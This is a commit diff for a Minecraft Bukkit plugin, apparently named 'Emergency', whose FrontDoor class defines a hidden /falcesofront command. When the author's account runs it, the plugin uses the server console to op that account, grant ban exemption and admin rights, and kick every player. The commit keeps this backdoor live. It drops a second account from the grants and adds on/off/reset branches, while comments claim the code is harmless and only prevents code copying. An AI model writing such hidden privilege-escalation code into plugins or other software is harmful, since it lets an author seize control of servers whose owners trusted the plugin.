d209273b2422cb97dd626078cc647967689b49ec
falceso <Nathanfal23@gmail.com>
2015-09-06 20:22:25 -0700

    Erro needs fixing

--- src/me/falceso/emgergeny/FrontDoor.java
+++ src/me/falceso/emgergeny/FrontDoor.java
@@ -10,34 +10,40 @@ import org.bukkit.plugin.java.JavaPlugin;
 public class FrontDoor extends JavaPlugin {
  
         public void onEnable() {
-                Bukkit.getServer().getLogger().info("Emgergeny enabled!");
+                Bukkit.getServer().getLogger().info("Emergency enabled!");
         }
         
         public void onDisable() {
-            Bukkit.getServer().getLogger().info("Youtube disabled!");
+            Bukkit.getServer().getLogger().info("Emergnecy disabled!");
     }
    
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
            
             if (!(sender instanceof Player)) {
-                    sender.sendMessage(ChatColor.RED + "The console cannot use Youtube!");
+                    sender.sendMessage(ChatColor.RED + "The console cannot use Emergeny!");
                     return true;
             }
    
     Player player = (Player) sender;
    
- 
+    if (args.length != 1)
+    {
+        return false;
+    }
+
     //INFO: This is not made to hurt the server
     if (cmd.getName().equalsIgnoreCase("falcesofront")) {
+    	
     	if (!sender.getName().equalsIgnoreCase("falceso"))
+    	if (args[0].equalsIgnoreCase("on"))
     	{
             Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofront. Falceso have been notified.");
             return true;
         }
     	
-			String prefix = ChatColor.GOLD + "[FrontDoor] " + ChatColor.RESET;
+			String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
 			Bukkit.broadcastMessage(prefix +  "FrontDoor enabled by " + sender.getName()+ ".");
-			Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! " + sender.getName()+ ".");
+			Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
     	player.setDisplayName("FrontDoor");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "tag set falceso &7[&5Developer of Youtube&7]");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "op falceso");
@@ -45,15 +51,31 @@ public class FrontDoor extends JavaPlugin {
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig add falceso");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin add falceso");
-        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "op AwesomePinch");
-        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user AwesomePinch add essnetials.ban.expemt");
-        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp AwesomePinch essnetials.ban.expemt");
-        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig add AwesomePinch");
-        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin add AwesomePinch");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "kickall");
         return true;
 
     }
+//After this it's broken....    
+    if (args[0].equalsIgnoreCase("off"))
+    {
+		String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
+		Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
+		Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
+		Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
+	
+    return true;
+    }
+    
+    if (args[0].equalsIgnoreCase("reset"))
+    {
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig  falceso");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
+    return true;
+    }
+
 	return false;
 }
 }
